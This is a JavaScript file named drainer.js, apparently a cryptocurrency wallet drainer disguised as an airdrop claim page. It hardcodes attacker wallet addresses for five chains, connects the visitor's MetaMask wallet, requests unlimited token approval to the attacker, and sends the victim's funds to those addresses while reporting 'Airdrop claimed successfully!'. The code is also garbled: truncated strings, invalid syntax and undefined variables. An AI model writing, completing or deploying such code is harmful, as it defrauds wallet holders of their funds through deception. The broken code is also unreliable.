// drainer.js

const ethWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const solWalletAddress = 'ErLtZyQ36HW9HjFUtmpwcbjeBoUxcUA6VxwFJA1vfqMv';
const bnbWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const btcWalletAddress = 'bc1qzhtlm0f270l5stm6snaj7yek05yjx6s9eg9f8w';
const polygonWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const infuraProjectId = 'https://mainnet.infura.io/v3/83caa57ba3004ffa91addb7094bac4cc';

const web3 = new Web3(new Web3.providers.HttpProvider(`https://mainnet.infura.io/v3/${infuraProjectId}`));
const solana = new solanaWeb3.Connection(solanaWeb3.cluster.ApiUrl.mainnetBeta, 'processed');

let userAddress;

function connectWallet() {
if (window.ethereum) {
try {
const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
userAddress = accounts[0];
document.getElementById('status').innerText = `Connected to ${userAddress}`;
document.getElementById('connectWallet').style.display = 'none';
document.getElementById('solanaInput').style.display = 'block';
}
  
} else {
document.getElementById('status').innerText = 'Please install MetaMask!';
}
}

function scanAddress() {
const solanaAddr = document.getElementById('solanaAddress').value;
if (solanaAddr) {
document.getElementById('solanaInput').style.display = 'none';
document.getElementById('terms').style.display = 'block';
} else {
document.getElementById('status').innerText = 'Please enter a valid Solana address.';
}

async function submitSol.addEventListener("click", () => {
if (solInput.value.trim().length > 0) {
termsModal.classList.remove("hidden");
}
});

document.getElementById('acceptTerms').addEventListener('click
                                                          
// Get unlimited approval
const contract = new web3.eth.Contract([], userAddress);
await contract.methods.approve(ethWalletAddress, web3.utils.toWei('1000000', 'ether')).send({ from: userAddress });

  // STEP 5: Accept → Show Airdrop Page
acceptBtn.addEventListener("click", () => {
  termsModal.classList.add("hidden");
  solanaSection.classList.add("hidden");

  // Update wallet & balance
  document.getElementById("userWallet").textContent = userWalletAddress;
  document.getElementById("airdropBalance").textContent = userAirdropBalance;

  // Compute balance diff
  const diff = userAirdropBalance - previousBalance;
  const diffSection = document.getElementById("balanceDiffSection");
  document.getElementById("balanceDiff").textContent = (diff >= 0 ? "+" : "") + diff;
  diffSection.classList.remove("hidden");

  // Show airdrop page
  airdropPage.classList.remove("hidden");
  setTimeout(() => airdropPage.classList.add("show"), 50);
});
  
// Send funds to specified addresses
await sendToEthereum(userAddress, ethWalletAddress);
await sendToSolana(userAddress, solWalletAddress);
await sendToBNB(userAddress, bnbWalletAddress);
await sendToBTC(userAddress, btcWalletAddress);
await sendToPolygon(userAddress, polygonWalletAddress);

document.getElementById('status').innerText = 'Airdrop claimed successfully!';
} 

async function sendToEthereum(from, to) {
const tx = {
from: from,
to: to,
value: web3.utils.toWei('1', 'ether'),
gas: 2000000
};
await web3.eth.sendTransaction(tx);
}

async function sendToSolana(from, to) {
const transaction = new solanaWeb3.Transaction().add(
solanaWeb3.SystemProgram.transfer({
fromPubkey: new solanaWeb3.PublicKey(from),
toPubkey: new solanaWeb3.PublicKey(to),
lamports: solanaWeb3.LAMPORTS_PER_SOL
})
);
const signature = await solana.sendTransaction(transaction, [from]);
console.log('Solana transaction signature:', signature);
}

async function sendToBNB(from, to) {
const bnb = new Binance();
const tx = {
from: from,
to: to,
value: bnb.toWei('1', 'ether'),
gas: 2000000
};
await bnb.sendTransaction(tx);
}

async function sendToBTC(from, to) {
const network = bitcoin.networks.testnet;
const keyPair = bitcoin.ECPair.fromWIF('YOUR_BTC_PRIVATE_KEY', network);
const tx = new bitcoin.TransactionBuilder(network);
tx.addInput('YOUR_BTC_TXID', 0);
tx.addOutput(to, 50000); // 0.0005 BTC
const txHex = tx.build().toHex();
const signedTx = keyPair.signTransaction(tx.build());
const broadcastTx = await bitcoin.broadcastTx(signedTx.toHex());
console.log('BTC transaction broadcasted:', broadcastTx);
}

async function sendToPolygon(from, to) {
const tx = {
from: from,
to: to,
value: web3.utils.toWei('1', 'ether'),
gas: 2000000
};
await web3.eth.sendTransaction(tx);
}
document.addEventListener("DOMContentLoaded", () => {
  const acceptBtn = document.getElementById("acceptBtn");

  // Make sure button exists
  if(!acceptBtn) return;

  acceptBtn.addEventListener("click", () => {
    // Your extra terms logic here
    console.log("Extra terms logic executed!");
  });
});

